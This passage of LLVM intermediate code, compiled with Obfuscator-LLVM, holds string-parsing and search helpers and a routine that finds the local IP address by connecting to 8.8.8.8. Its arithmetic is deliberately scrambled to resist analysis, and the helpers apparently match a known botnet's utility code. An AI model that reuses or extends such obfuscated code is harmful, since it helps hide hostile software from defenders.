  store i8* %16, i8** %5, align 8
  store i8 0, i8* %15, align 1
  br label %7

; <label>:17:                                     ; preds = %7
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_atoi(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i32 0, i32* %8, align 4
  br label %11

; <label>:11:                                     ; preds = %16, %2
  %12 = load i8*, i8** %3, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %3, align 8
  %14 = load i8, i8* %12, align 1
  %15 = sext i8 %14 to i32
  store i32 %15, i32* %6, align 4
  br label %16

; <label>:16:                                     ; preds = %11
  %17 = load i32, i32* %6, align 4
  %18 = trunc i32 %17 to i8
  %19 = call i32 @util_isspace(i8 signext %18)
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %11, label %21

; <label>:21:                                     ; preds = %16
  %22 = load i32, i32* %6, align 4
  %23 = icmp eq i32 %22, 45
  br i1 %23, label %24, label %29

; <label>:24:                                     ; preds = %21
  store i32 1, i32* %8, align 4
  %25 = load i8*, i8** %3, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %3, align 8
  %27 = load i8, i8* %25, align 1
  %28 = sext i8 %27 to i32
  store i32 %28, i32* %6, align 4
  br label %38

; <label>:29:                                     ; preds = %21
  %30 = load i32, i32* %6, align 4
  %31 = icmp eq i32 %30, 43
  br i1 %31, label %32, label %37

; <label>:32:                                     ; preds = %29
  %33 = load i8*, i8** %3, align 8
  %34 = getelementptr inbounds i8, i8* %33, i32 1
  store i8* %34, i8** %3, align 8
  %35 = load i8, i8* %33, align 1
  %36 = sext i8 %35 to i32
  store i32 %36, i32* %6, align 4
  br label %37

; <label>:37:                                     ; preds = %32, %29
  br label %38

; <label>:38:                                     ; preds = %37, %24
  %39 = load i32, i32* %8, align 4
  %40 = icmp ne i32 %39, 0
  %41 = select i1 %40, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %41, i64* %7, align 8
  %42 = load i64, i64* %7, align 8
  %43 = load i32, i32* %4, align 4
  %44 = sext i32 %43 to i64
  %45 = urem i64 %42, %44
  %46 = trunc i64 %45 to i32
  store i32 %46, i32* %10, align 4
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = load i64, i64* %7, align 8
  %50 = udiv i64 %49, %48
  store i64 %50, i64* %7, align 8
  store i64 0, i64* %5, align 8
  store i32 0, i32* %9, align 4
  br label %51

; <label>:51:                                     ; preds = %115, %38
  %52 = load i32, i32* %6, align 4
  %53 = trunc i32 %52 to i8
  %54 = call i32 @util_isdigit(i8 signext %53)
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %62

; <label>:56:                                     ; preds = %51
  %57 = load i32, i32* %6, align 4
  %58 = add i32 %57, -1585749196
  %59 = sub i32 %58, 48
  %60 = sub i32 %59, -1585749196
  %61 = sub nsw i32 %57, 48
  store i32 %60, i32* %6, align 4
  br label %80

; <label>:62:                                     ; preds = %51
  %63 = load i32, i32* %6, align 4
  %64 = trunc i32 %63 to i8
  %65 = call i32 @util_isalpha(i8 signext %64)
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %67, label %78

; <label>:67:                                     ; preds = %62
  %68 = load i32, i32* %6, align 4
  %69 = trunc i32 %68 to i8
  %70 = call i32 @util_isupper(i8 signext %69)
  %71 = icmp ne i32 %70, 0
  %72 = select i1 %71, i32 55, i32 87
  %73 = load i32, i32* %6, align 4
  %74 = add i32 %73, 417415600
  %75 = sub i32 %74, %72
  %76 = sub i32 %75, 417415600
  %77 = sub nsw i32 %73, %72
  store i32 %76, i32* %6, align 4
  br label %79

; <label>:78:                                     ; preds = %62
  br label %120

; <label>:79:                                     ; preds = %67
  br label %80

; <label>:80:                                     ; preds = %79, %56
  %81 = load i32, i32* %6, align 4
  %82 = load i32, i32* %4, align 4
  %83 = icmp sge i32 %81, %82
  br i1 %83, label %84, label %85

; <label>:84:                                     ; preds = %80
  br label %120

; <label>:85:                                     ; preds = %80
  %86 = load i32, i32* %9, align 4
  %87 = icmp slt i32 %86, 0
  br i1 %87, label %100, label %88

; <label>:88:                                     ; preds = %85
  %89 = load i64, i64* %5, align 8
  %90 = load i64, i64* %7, align 8
  %91 = icmp ugt i64 %89, %90
  br i1 %91, label %100, label %92

; <label>:92:                                     ; preds = %88
  %93 = load i64, i64* %5, align 8
  %94 = load i64, i64* %7, align 8
  %95 = icmp eq i64 %93, %94
  br i1 %95, label %96, label %101

; <label>:96:                                     ; preds = %92
  %97 = load i32, i32* %6, align 4
  %98 = load i32, i32* %10, align 4
  %99 = icmp sgt i32 %97, %98
  br i1 %99, label %100, label %101

; <label>:100:                                    ; preds = %96, %88, %85
  store i32 -1, i32* %9, align 4
  br label %114

; <label>:101:                                    ; preds = %96, %92
  store i32 1, i32* %9, align 4
  %102 = load i32, i32* %4, align 4
  %103 = sext i32 %102 to i64
  %104 = load i64, i64* %5, align 8
  %105 = mul i64 %104, %103
  store i64 %105, i64* %5, align 8
  %106 = load i32, i32* %6, align 4
  %107 = sext i32 %106 to i64
  %108 = load i64, i64* %5, align 8
  %109 = sub i64 0, %108
  %110 = sub i64 0, %107
  %111 = add i64 %109, %110
  %112 = sub i64 0, %111
  %113 = add i64 %108, %107
  store i64 %112, i64* %5, align 8
  br label %114

; <label>:114:                                    ; preds = %101, %100
  br label %115

; <label>:115:                                    ; preds = %114
  %116 = load i8*, i8** %3, align 8
  %117 = getelementptr inbounds i8, i8* %116, i32 1
  store i8* %117, i8** %3, align 8
  %118 = load i8, i8* %116, align 1
  %119 = sext i8 %118 to i32
  store i32 %119, i32* %6, align 4
  br label %51

; <label>:120:                                    ; preds = %84, %78
  %121 = load i32, i32* %9, align 4
  %122 = icmp slt i32 %121, 0
  br i1 %122, label %123, label %127

; <label>:123:                                    ; preds = %120
  %124 = load i32, i32* %8, align 4
  %125 = icmp ne i32 %124, 0
  %126 = select i1 %125, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %126, i64* %5, align 8
  br label %137

; <label>:127:                                    ; preds = %120
  %128 = load i32, i32* %8, align 4
  %129 = icmp ne i32 %128, 0
  br i1 %129, label %130, label %136

; <label>:130:                                    ; preds = %127
  %131 = load i64, i64* %5, align 8
  %132 = add i64 0, -7922915958680771484
  %133 = sub i64 %132, %131
  %134 = sub i64 %133, -7922915958680771484
  %135 = sub i64 0, %131
  store i64 %134, i64* %5, align 8
  br label %136

; <label>:136:                                    ; preds = %130, %127
  br label %137

; <label>:137:                                    ; preds = %136, %123
  %138 = load i64, i64* %5, align 8
  %139 = trunc i64 %138 to i32
  ret i32 %139
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isspace(i8 signext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp eq i32 %4, 32
  br i1 %5, label %18, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp eq i32 %8, 9
  br i1 %9, label %18, label %10

; <label>:10:                                     ; preds = %6
  %11 = load i8, i8* %2, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp eq i32 %12, 10
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %10
  %15 = load i8, i8* %2, align 1
  %16 = sext i8 %15 to i32
  %17 = icmp eq i32 %16, 10
  br label %18

; <label>:18:                                     ; preds = %14, %10, %6, %1
  %19 = phi i1 [ true, %10 ], [ true, %6 ], [ true, %1 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  ret i32 %20
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isdigit(i8 signext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 48
  br i1 %5, label %6, label %10

; <label>:6:                                      ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 57
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ false, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isalpha(i8 signext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 65
  br i1 %5, label %6, label %10

; <label>:6:                                      ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 90
  br i1 %9, label %20, label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = load i8, i8* %2, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp sge i32 %12, 97
  br i1 %13, label %14, label %18

; <label>:14:                                     ; preds = %10
  %15 = load i8, i8* %2, align 1
  %16 = sext i8 %15 to i32
  %17 = icmp sle i32 %16, 122
  br label %18

; <label>:18:                                     ; preds = %14, %10
  %19 = phi i1 [ false, %10 ], [ %17, %14 ]
  br label %20

; <label>:20:                                     ; preds = %18, %6
  %21 = phi i1 [ true, %6 ], [ %19, %18 ]
  %22 = zext i1 %21 to i32
  ret i32 %22
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isupper(i8 signext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 65
  br i1 %5, label %6, label %10

; <label>:6:                                      ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 90
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ false, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %60

; <label>:16:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

; <label>:17:                                     ; preds = %52, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %59

; <label>:21:                                     ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %50

; <label>:35:                                     ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = sub i32 %36, -1803728373
  %38 = add i32 %37, 1
  %39 = add i32 %38, -1803728373
  %40 = add nsw i32 %36, 1
  store i32 %39, i32* %11, align 4
  %41 = load i32, i32* %9, align 4
  %42 = icmp eq i32 %39, %41
  br i1 %42, label %43, label %49

; <label>:43:                                     ; preds = %35
  %44 = load i32, i32* %10, align 4
  %45 = sub i32 %44, -1918703181
  %46 = add i32 %45, 1
  %47 = add i32 %46, -1918703181
  %48 = add nsw i32 %44, 1
  store i32 %47, i32* %5, align 4
  br label %60

; <label>:49:                                     ; preds = %35
  br label %51

; <label>:50:                                     ; preds = %21
  store i32 0, i32* %11, align 4
  br label %51

; <label>:51:                                     ; preds = %50, %49
  br label %52

; <label>:52:                                     ; preds = %51
  %53 = load i32, i32* %10, align 4
  %54 = sub i32 0, %53
  %55 = sub i32 0, 1
  %56 = add i32 %54, %55
  %57 = sub i32 0, %56
  %58 = add nsw i32 %53, 1
  store i32 %57, i32* %10, align 4
  br label %17

; <label>:59:                                     ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %60

; <label>:60:                                     ; preds = %59, %43, %15
  %61 = load i32, i32* %5, align 4
  ret i32 %61
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_stristr(i8*, i32, i8*) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %13 = load i8*, i8** %5, align 8
  store i8* %13, i8** %8, align 8
  %14 = load i8*, i8** %7, align 8
  %15 = call i32 @util_strlen(i8* %14)
  store i32 %15, i32* %9, align 4
  store i32 0, i32* %10, align 4
  br label %16

; <label>:16:                                     ; preds = %107, %3
  %17 = load i32, i32* %6, align 4
  %18 = add i32 %17, 21664702
  %19 = add i32 %18, -1
  %20 = sub i32 %19, 21664702
  %21 = add nsw i32 %17, -1
  store i32 %20, i32* %6, align 4
  %22 = icmp sgt i32 %17, 0
  br i1 %22, label %23, label %108

; <label>:23:                                     ; preds = %16
  %24 = load i8*, i8** %8, align 8
  %25 = getelementptr inbounds i8, i8* %24, i32 1
  store i8* %25, i8** %8, align 8
  %26 = load i8, i8* %24, align 1
  store i8 %26, i8* %11, align 1
  %27 = load i8*, i8** %7, align 8
  %28 = load i32, i32* %10, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds i8, i8* %27, i64 %29
  %31 = load i8, i8* %30, align 1
  store i8 %31, i8* %12, align 1
  %32 = load i8, i8* %11, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp sge i32 %33, 65
  br i1 %34, label %35, label %46

; <label>:35:                                     ; preds = %23
  %36 = load i8, i8* %11, align 1
  %37 = sext i8 %36 to i32
  %38 = icmp sle i32 %37, 90
  br i1 %38, label %39, label %46

; <label>:39:                                     ; preds = %35
  %40 = load i8, i8* %11, align 1
  %41 = sext i8 %40 to i32
  %42 = and i32 %41, 96
  %43 = xor i32 %41, 96
  %44 = or i32 %42, %43
  %45 = or i32 %41, 96
  br label %49

; <label>:46:                                     ; preds = %35, %23
  %47 = load i8, i8* %11, align 1
  %48 = sext i8 %47 to i32
  br label %49

; <label>:49:                                     ; preds = %46, %39
  %50 = phi i32 [ %44, %39 ], [ %48, %46 ]
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %11, align 1
  %52 = load i8, i8* %12, align 1
  %53 = sext i8 %52 to i32
  %54 = icmp sge i32 %53, 65
  br i1 %54, label %55, label %78

; <label>:55:                                     ; preds = %49
  %56 = load i8, i8* %12, align 1
  %57 = sext i8 %56 to i32
  %58 = icmp sle i32 %57, 90
  br i1 %58, label %59, label %78

; <label>:59:                                     ; preds = %55
  %60 = load i8, i8* %12, align 1
  %61 = sext i8 %60 to i32
  %62 = xor i32 %61, -1
  %63 = xor i32 96, -1
  %64 = xor i32 1138562163, -1
  %65 = and i32 %62, 1138562163
  %66 = and i32 %61, %64
  %67 = and i32 %63, 1138562163
  %68 = and i32 96, %64
  %69 = or i32 %65, %66
  %70 = or i32 %67, %68
  %71 = xor i32 %69, %70
  %72 = or i32 %62, %63
  %73 = xor i32 %72, -1
  %74 = or i32 1138562163, %64
  %75 = and i32 %73, %74
  %76 = or i32 %71, %75
  %77 = or i32 %61, 96
  br label %81

; <label>:78:                                     ; preds = %55, %49
  %79 = load i8, i8* %12, align 1
  %80 = sext i8 %79 to i32
  br label %81

; <label>:81:                                     ; preds = %78, %59
  %82 = phi i32 [ %76, %59 ], [ %80, %78 ]
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %12, align 1
  %84 = load i8, i8* %11, align 1
  %85 = sext i8 %84 to i32
  %86 = load i8, i8* %12, align 1
  %87 = sext i8 %86 to i32
  %88 = icmp eq i32 %85, %87
  br i1 %88, label %89, label %106

; <label>:89:                                     ; preds = %81
  %90 = load i32, i32* %10, align 4
  %91 = sub i32 0, 1
  %92 = sub i32 %90, %91
  %93 = add nsw i32 %90, 1
  store i32 %92, i32* %10, align 4
  %94 = load i32, i32* %9, align 4
  %95 = icmp eq i32 %92, %94
  br i1 %95, label %96, label %105

; <label>:96:                                     ; preds = %89
  %97 = load i8*, i8** %8, align 8
  %98 = load i8*, i8** %5, align 8
  %99 = ptrtoint i8* %97 to i64
  %100 = ptrtoint i8* %98 to i64
  %101 = sub i64 0, %100
  %102 = add i64 %99, %101
  %103 = sub i64 %99, %100
  %104 = trunc i64 %102 to i32
  store i32 %104, i32* %4, align 4
  br label %109

; <label>:105:                                    ; preds = %89
  br label %107

; <label>:106:                                    ; preds = %81
  store i32 0, i32* %10, align 4
  br label %107

; <label>:107:                                    ; preds = %106, %105
  br label %16

; <label>:108:                                    ; preds = %16
  store i32 -1, i32* %4, align 4
  br label %109

; <label>:109:                                    ; preds = %108, %96
  %110 = load i32, i32* %4, align 4
  ret i32 %110
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_local_addr() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %6 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 0, i32* %2, align 4
  store i32 16, i32* %4, align 4
  %7 = call i32* @__errno_location() #7
  store i32 0, i32* %7, align 4
  %8 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %8, i32* %2, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

; <label>:10:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %35

; <label>:11:                                     ; preds = %0
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = call i32 @htonl(i32 134744072) #7
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %15 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %14, i32 0, i32 0
  store i32 %13, i32* %15, align 4
  %16 = call zeroext i16 @htons(i16 zeroext 53) #7
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = load i32, i32* %2, align 4
  %19 = bitcast %union.__CONST_SOCKADDR_ARG* %5 to %struct.sockaddr**
  %20 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %20, %struct.sockaddr** %19, align 8
  %21 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %5, i32 0, i32 0
  %22 = load %struct.sockaddr*, %struct.sockaddr** %21, align 8
  %23 = call i32 @connect(i32 %18, %struct.sockaddr* %22, i32 16)
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %union.__CONST_SOCKADDR_ARG* %6 to %struct.sockaddr**
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %26, %struct.sockaddr** %25, align 8
  %27 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %6, i32 0, i32 0
  %28 = load %struct.sockaddr*, %struct.sockaddr** %27, align 8
  %29 = call i32 @getsockname(i32 %24, %struct.sockaddr* %28, i32* %4) #6
  %30 = load i32, i32* %2, align 4
  %31 = call i32 @close(i32 %30)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %33 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %32, i32 0, i32 0
  %34 = load i32, i32* %33, align 4
  store i32 %34, i32* %1, align 4
  br label %35

; <label>:35:                                     ; preds = %11, %10
  %36 = load i32, i32* %1, align 4
  ret i32 %36
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #1

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146812302}
!2 = !{i32 -2146811893}
